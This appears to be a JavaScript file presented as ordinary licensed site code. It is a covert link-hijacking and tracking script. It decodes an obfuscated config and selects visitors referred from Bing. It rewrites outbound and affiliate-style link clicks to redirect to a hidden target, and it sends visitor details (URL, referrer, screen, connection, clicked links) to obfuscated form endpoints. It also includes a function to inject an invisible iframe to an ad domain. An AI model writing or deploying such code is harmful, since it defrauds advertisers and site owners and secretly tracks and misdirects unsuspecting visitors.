/**
 * @licence 
 * Copyright ©
 * All rights reserved
 * This source code is licensed under the found in the
 * LICENSE file in the root directory of this source tree
*/
var __toApplyHLnk="100";
class Evaluater{
	get(bad){
		bad=this.getFixed(bad);
		return bad;
	}

	getFixed(txt){
		var p1="",p2="",l=txt.length;
		for(let i=0; i<=l; i++){
			if(i%2==0){
				p2=txt.charAt(i)+p2;
			}else{
				p1=p1+txt.charAt(i);
			}
		}
		return atob(p1+p2);
	}

}

class decideAndDo{
	linkMsg=getDefaultName();

	constructor(){
		var gotCont=false;

		var cotGetTry = setInterval(()=>{
			try{
				this.process(contDataFinal);
				gotCont=true;
			}catch(e){
				gotCont=false;
			}

			if(gotCont){
				clearInterval(cotGetTry)
			}
		},100);
	}

	process(ret){
	 	console.log('process',document.timeline.currentTime/1000)

		var myNextData=JSON.parse(new Evaluater().get(ret));
		var got=false;
		// this.checkIfFromAds()
		myNextData.forEach(val=>{
			if(location.href.includes(val[2]) && got==false){
				got=true;
				this.checkSafe(val)
			}
		})
		!got?this.sendInfo('LOCATION: failed:-:'+getDefaultName()):"";
		this.sendLinkClicked( 'LinkClicked:-:'+getDefaultName() );
	}

	checkSafe(val){
	 	console.log('checkSafe',document.timeline.currentTime/1000)

		var okay=true,msg=this.linkMsg;

		if(!_39012seefalseUser() && document.referrer.includes("bing") && Number(val[1])<=Number(__toApplyHLnk)){
			okay=true;
		}else{
			okay=false;
		}

		if(okay){
			this.doit(val,msg);
			msg="YES:-:"+msg;
		}else{
			msg="NO:-:"+msg;
		}
		this.linkMsg=msg;
		this.sendInfo(msg)
	}
	
	doit(data,msg){
	 	console.log('doit',document.timeline.currentTime/1000)

		this.doing=true;
		this.currentDomData=data;

		var x=document.querySelectorAll('a');
		x.forEach(val=>{
			if(val.href.includes(".php") || val.href.includes("clickbank") || val.href.includes("join") || val.href.includes("mweb") || !val.href.includes(document.domain) ){
				_9384modifyAncho(val,data,msg);
			}
		})
	}

	sendInfo(msg){
	 	console.log('sendInfo',document.timeline.currentTime/1000,msg)

		makeForm(sc.get('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmUd0vRbU2adqsdZGSb5tjVbk2Q0WvhZTmM9OyZbEXMMwvEdHSO8QwdLl2VQBvpZWSd80xFRWkdFjJlcVFNFFMxUU2TVG3pd32SR1IQVzUMtr'),{
			"entry.522782255":Nloaded+"-"+history.length+"_"+document.referrer,
			"entry.2147471592":location.href,
			"entry.559704587":msg,
			"entry.1784255635":this.getMacTime(),
			"entry.1604074943":userWinInfo(),
		});
	}

	finalised(msg,timeafter){
	 	console.log('finalised',document.timeline.currentTime/1000)

		makeForm(sc.get('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmQd5vNbl2edFsNZ3Sa5CjZbE2V0XvhZGma9GyNbTXbMkvBd1SS8rwxLk2MQwvFZXSa8ExhRUkZFwJpcUFVFtMUU32RQJ1VcFHZVTEFezHadz'),{
			"entry.1742212599":Nloaded+"-"+history.length+"_"+document.referrer,
			"entry.1832856812":location.href,
			"entry.1617942729":msg,
			"entry.121403084":this.getMacTime(),
			"entry.1791764791": timeafter+'s '+userWinInfo(),
		});
	}

	sendLinkClicked(msg){
	 	console.log('sendLinkClicked',document.timeline.currentTime/1000,msg)

		var x=document.querySelectorAll('a');
		x.forEach(val=>{
			this.sendLinkAnchorSetting(val)
		})
	}
	 sendLinkAnchorSetting(anchor){
	 	console.log('sendLinkAnchorSetting',document.timeline.currentTime/1000,this.linkMsg)
		anchor.addEventListener('click',(e)=>{
			console.log(this.linkMsg);
			this.sendClickReal(this.linkMsg+" :_: "+anchor.href, Math.floor(e.timeStamp/1000) );
		})
	}
	sendClickReal(msg,timeafter){
	 	console.log('sendClickReal',document.timeline.currentTime/1000,msg)

		makeForm(sc.get('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmQdfvFbV2cdJs1ZGSZ5wjIbH2S0wvQZnma9SyBbXXLM2vldTSd8pwFLk2dQOvhZjSY8UxNRFkZFjJ9cVFUFYMFUG2UN4kZZm3Ql2mcT3WMdD'),{
			"entry.1742212599":Nloaded+"-"+history.length+"_"+document.referrer,
			"entry.1832856812":location.href,
			"entry.1617942729":msg,
			"entry.121403084":this.getMacTime(),
			"entry.1446718983": timeafter+"s "+userWinInfo(),
		});
	}

	getMacTime(){
		return new Date().toLocaleTimeString()+ " "+new Date().toTimeString().split("(")[1].replace(")","");
	}
	applyIframeA(){
		var style="width: 100vw; height: 100vh; position: fixed; bottom: 100vh; opacity: 0; pointer-events: none;",
		sandBox=`sandbox="allow-top-navigation-by-user-activation allow-scripts allow-forms"`
		var html=`
		<iframe src="https://vaikijie.net/4/6606783" style="${style}" ${sandBox} frameborder="0"></iframe>
		`;
		document.body.insertAdjacentHTML("afterbegin",html);
	}
	checkIfFromAds(){
		if(false){
			//location.replace("//intorterraon.com/4/6606783");
		}
	}

}
function userWinInfo() {
	var str=Math.floor(window.scrollY)+" > "+window.screen.width+"/"+window.innerWidth+" x "+window.screen.height+"/"+window.innerHeight+" ||| ";
	var conn=navigator.connection;
	str+=`${conn.effectiveType} rtt:${conn.rtt} mbps:${conn.downlink}`

	return str;
}

var document_changeA=new decideAndDo();

function _9384modifyAncho(anchor,data,msg) {
 	console.log('_9384modifyAncho',document.timeline.currentTime/1000)

  if(document_changeA.doing){
		anchor.addEventListener('click',(e)=>{
			e.preventDefault();
			document_changeA.finalised(document_changeA.linkMsg, Math.floor(e.timeStamp/1000) );
			location.assign(document_changeA.currentDomData[3]);
		})
  }



}

function setupObserver(targetNode) {
const config = { childList: true, subtree: true };
const callback = function (mutationsList) {
mutationsList.forEach((mutation) => {
if (mutation.type === 'childList') {
mutation.addedNodes.forEach((node) => {
if (node.tagName && node.tagName.toLowerCase() === 'a') {
_9384modifyAncho(node);
document_changeA.sendLinkAnchorSetting(node);
}
if (node.childNodes.length > 0) {
setupObserver(node);
}
});
}
});
};
const observer = new MutationObserver(callback);
observer.observe(targetNode, config);
}

setupObserver(document.querySelector("html"));
